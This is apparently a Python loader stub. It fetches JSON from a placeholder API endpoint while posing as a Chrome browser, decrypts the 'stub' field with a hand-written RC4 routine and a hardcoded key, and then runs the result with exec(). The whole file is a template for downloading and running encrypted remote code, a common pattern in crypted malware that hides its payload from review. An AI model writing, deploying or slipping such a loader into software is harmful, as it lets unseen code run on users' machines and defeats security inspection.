from requests       import get
#from utils          import PySec
from Crypto.Cipher  import AES
from base64         import b64decode

class PySec():
    @staticmethod
    def decrypt(_stub: str, _key: str) -> str:
        d = list(range(256))
        j = 0
        key_length = len(_key)
        for i in range(256):
            j = (j + d[i] + ord(_key[i % key_length])) % 256
            d[i], d[j] = d[j], d[i]
        i = 0
        j = 0
        decrypted = []
        data = b64decode(_stub)
        for byte in data:
            i = (i + 1) % 256
            j = (j + d[i]) % 256
            d[i], d[j] = d[j], d[i]
            decrypted.append(byte ^ d[(d[i] + d[j]) % 256])
        return bytes(decrypted).decode()
    
    @staticmethod
    def encrypt(_stub, _key) -> str: #Nah u tought its would be that tuff to include the encrypt algo here lmao
        return None
    


auth = get("your_api_endpoint", headers= {
    "Connection": "keep-alive",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate",
}).json()

stub = PySec().decrypt(auth['stub'], 'MySecKey!**1')
exec(stub)
